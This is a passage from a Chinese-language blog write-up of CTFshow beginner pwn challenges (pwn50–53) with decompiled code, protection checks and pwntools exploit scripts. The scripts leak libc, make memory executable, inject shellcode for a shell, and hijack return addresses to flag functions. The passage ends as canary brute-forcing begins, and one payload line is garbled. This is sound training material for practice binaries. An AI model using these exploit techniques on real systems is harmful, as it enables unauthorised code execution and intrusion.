class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rsi ; ret&quot;</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x2601f</span></span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rdx ;ret &quot;</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x142c92</span></span><br><span class="line"><span class="comment">######### step2 : mprotect_bss_to_rwx</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(bss_page_addr)</span><br><span class="line">payload+= p64(pop_rsi_ret)</span><br><span class="line">payload+= p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+= p64(pop_rdx_ret)</span><br><span class="line">payload+= p64(<span class="number">0x7</span>)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">######### step3 : gets_shellcode_to_bss</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(shellcode_addr)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以看到此时shellcode已经写入我们构造的bss段<br>最后一步就是跳转至此进行get shell了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28127)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4007e3</span> <span class="comment"># 0x00000000004007e3 : pop rdi ; ret</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">bss_page_addr = <span class="number">0x601000</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">shellcode_addr = <span class="number">0x602000</span> - <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ctfshow))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_page_addr))</span><br><span class="line"><span class="comment">######### step1 : leak_libc</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(ctfshow)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">leak_addr = u64((io.recvline().split(<span class="string">b&quot;\x0a&quot;</span>)[<span class="number">0</span>]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = leak_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = 0x%x&quot;</span>,libc.address)</span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rsi ; ret&quot;</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x2601f</span></span><br><span class="line"><span class="comment"># ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;: pop rdx ;ret &quot;</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x142c92</span></span><br><span class="line"><span class="comment">######### step2 : mprotect_bss_to_rwx</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(bss_page_addr)</span><br><span class="line">payload+= p64(pop_rsi_ret)</span><br><span class="line">payload+= p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+= p64(pop_rdx_ret)</span><br><span class="line">payload+= p64(<span class="number">0x7</span>)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">######### step3 : gets_shellcode_to_bss</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(pop_rdi_ret)</span><br><span class="line">payload+= p64(shellcode_addr)</span><br><span class="line">payload+= p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">######### step4 : ret2bss</span></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload+= p64(shellcode_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello CTFshow&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn51"><a href="#pwn51" class="headerlink" title="pwn51"></a>pwn51</h2><p>Hint：I‘m IronMan</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭栈保护以及PIE</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_80492E6(&amp;a1);</span><br><span class="line">  sub_8049343();</span><br><span class="line">  alarm(<span class="number">0x1Eu</span>);</span><br><span class="line">  sub_8049059();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别跟进这几个函数，然后修改函数名，便于分析：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo(&amp;a1);</span><br><span class="line">  alarm(<span class="number">0x1Eu</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进漏洞函数ctfshow：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-Ch] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-8h] [ebp-80h]</span></span><br><span class="line">  _BYTE v8[<span class="number">12</span>]; <span class="comment">// [esp+0h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">24</span>]; <span class="comment">// [esp+2Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">24</span>]; <span class="comment">// [esp+44h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Who are you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;unk_804D0A0, &amp;unk_804A350);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, s);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v10, &amp;unk_804D0B8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v11, &amp;unk_804D0A0);</span><br><span class="line">  sub_8048F06(v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v11, v11, v10);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v10, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( sub_80496D6(v8) &gt; <span class="number">1u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;unk_804D0A0, &amp;unk_804A350);</span><br><span class="line">    v0 = sub_8049700(v8, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_8049722(v0, &amp;unk_804A350) )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = sub_8049700(v8, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_80496D6(v8);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt;= i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, <span class="string">&quot;IronMan&quot;</span>);</span><br><span class="line">      v3 = sub_8049700(v8, i);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(&amp;unk_804D0A0, v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  src = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str(&amp;unk_804D0A0);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Wow!you are:%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> sub_8049616(v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，与我们平时分析的不太一样，这个程序是c++写的。在往s中read的时候大小没有问题，但是程序在下面将字符”I”替换成 了”IronMan”，最后在strcpy的时候发生了溢出。只需要简单计算一下 1 </p><p>- 7 ，那么在输入16个“I” 就会被替换为 16 * 7 &#x3D; 112个字符，而s距ebp的距离为 0x6c &#x3D; 108</p><p>正常溢出覆盖到返回地址就是 cyclic(0x6c+4) &#x3D; cyclic(112) ,输入16个I刚好替换成 16个”IronMan”，刚好是112个，也就刚好覆盖到返回地址</p><p>按住shift + F12查看一下字符串：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:0804A33100000012Ccat /ctfshow_flag</span><br></pre></td></tr></table></figure><p>看到有 “cat &#x2F;ctfshow_flag”关键字符串，进行查看在哪里进行了调用：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804902E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有PIE和canary直接利用即可。再覆盖到返回地址后加上上述的后门函数地址即可获得flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28167)</span></span><br><span class="line">get_flag = <span class="number">0x804902E</span></span><br><span class="line">payload = <span class="string">b&quot;I&quot;</span>*<span class="number">16</span> + p32(get_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 906</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Who are you?</span><br><span class="line">    * *************************************</span><br><span class="line">Who are you?</span><br><span class="line">Wow!you are:IronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronManIronMan.\x90\x04\x08</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn52"><a href="#pwn52" class="headerlink" title="pwn52"></a>pwn52</h2><p>Hint：迎面走来的flag让我如此蠢蠢欲动</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭栈保护与PIE</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是经典的栈溢出漏洞，再查看一下程序的敏感字符串,发现了flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> n876, <span class="type">int</span> n877)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( n876 == <span class="number">876</span> &amp;&amp; n877 == <span class="number">877</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)<span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先打开文件 “&#x2F;ctfshow_flag”，从文件中读取内容到字符数组 s 中，然后根据输入参数的值进行条件判断。如果输入参数的值满足特定条件，将读取的内容通过 printf 输出到屏幕，并返回字符串 s的指针。否则，返回文件读取的内容。</p><p>这里我们需要让a1 &#x3D; 0x36C 且a2 &#x3D; 0x36D,即可获得flag</p><p>那么我们首先需要利用栈溢出漏洞将程序流程劫持到flag函数，再满足它的条件即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(0x^c+<span class="number">4</span>)+p32(flag)+p32(<span class="number">0</span>)+p32(<span class="number">0x36c</span>)+p32(<span class="number">0x36d</span>)<span class="comment">#覆盖函数返回后的 下一个指令地址</span></span><br></pre></td></tr></table></figure><p>由于 payload 中传递给函数 flag 的参数满足了条件 a1 &#x3D;&#x3D; 0x36C 和 a2 &#x3D;&#x3D; 0x36D ，所以在函数内部的条件判断 if (a1 &#x3D;&#x3D; 0x36C &amp;&amp; a2 &#x3D;&#x3D; 0x36D) 将会为真，执行相应的代码块。</p><p>因此，通过构造特定的 payload，我们可以控制函数 flag 的执行路径，使其输出文件”&#x2F;ctfshow_flag” 中的内容。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28159)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(flag) + p32(<span class="number">0</span>) + p32(<span class="number">0x36c</span>) + p32(<span class="number">0x36d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 941</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : You should meet its conditions!</span><br><span class="line">    * *************************************</span><br><span class="line">What <span class="keyword">do</span> you want?</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x86\x85\x04\x08</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn53"><a href="#pwn53" class="headerlink" title="pwn53"></a>pwn53</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭栈保护与PIE</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  canary();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进canary函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">canary</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/canary.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/canary.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fread(&amp;global_canary, <span class="number">1u</span>, <span class="number">4u</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先声明了一个指针变量 stream ，用于表示文件指针。然后，使用 fopen 函数打开名为”&#x2F;canary.txt” 的文件，以只读模式打开。如果打开失败，即文件不存在或无法打开，程序将输出一条错误信息 “&#x2F;canary.txt: No such file or directory.” 并调用 exit(0) 终止程序。</p><p>再使用 fread 函数从打开的文件中读取 4 个字节（32 位）的数据，并将其存储到全局变global_canary 中。 &amp;global_canary 是 global_canary 变量的地址，用于指定数据的存储位置。</p><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+4h] [ebp-54h] BYREF</span></span><br><span class="line">  _DWORD v2[<span class="number">8</span>]; <span class="comment">// [esp+8h] [ebp-50h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> s1; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n31; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  n31 = <span class="number">0</span>;</span><br><span class="line">  s1 = global_canary;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( n31 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">char</span> *)v2 + n31, <span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)v2 + n31) == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++n31;</span><br><span class="line">  &#125;</span><br><span class="line">  __isoc99_sscanf(v2, <span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;global_canary, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error *** Stack Smashing Detected *** : Canary Value Incorrect!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where is the flag?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义了一些局部变量，包括 nbytes 、 v2 、 buf 、 s1 和 n31 。 nbytes 用于存储用户输入的字节数， v2 是一个字符数组，用于存储用户输入的内容， buf 是一个字符数组，用于存储从标准输入读取的数据。 s1 是一个整型变量，用于存储全局变量 global_canary 的值。 n31 是一个整型变量，用于控制循环。</p><p>再使用 read 函数从标准输入读取用户的输入，并存储到字符数组 v2 中。循环会一直进行，直到遇到换行符 \n （ASCII码为10）为止。每次读取一个字节，存储到 v2 中，并逐渐增加 n31 的值。 n31用于记录读取的字符个数。</p><p>接着使用 __isoc99_sscanf 函数将 v2 中的字符串转换为整数，并存储到 nbytes 中。这里使用%d 格式说明符将字符串解析为一个有符号整数。</p><p>使用 printf 输出提示信息 “$ “，表示等待用户输入。接着，使用 read 函数从标准输入读取nbytes 个字节的数据，并将数据存储到缓冲区 buf 中。</p><p>之后，代码通过比较 s1 和全局变量 global_canary 的值来检查堆栈的完整性。如果两者的值不相等，表示堆栈被破坏，输出错误信息 “Error *** Stack Smashing Detected *** : Canary ValueIncorrect!”，并调用 exit(-1) 终止程序。</p><p>最后，代码输出信息 “Where is the flag?”，并调用 fflush(stdout) 刷新标准输出缓冲区。</p><p>总结起来，这段代码的功能是从标准输入读取用户输入的字节数，并将相应字节数的数据读取到缓冲区 buf 中。然后，它会检查堆栈的完整性，如果堆栈被破坏，则输出错误信息并终止程序。我们可以看出程序是模拟了一个保护，但是由于文件名不变，其内容大概率也是不会变化的。加上题目提示猜测可以进行爆破。</p><p>还注意到有一个flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在爆破完成知道canary的情况下，剩下的就是简单的栈溢出劫持程序执行流至flag函数就能get flag了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地</span></span><br><span class="line">$ <span class="built_in">echo</span> <span 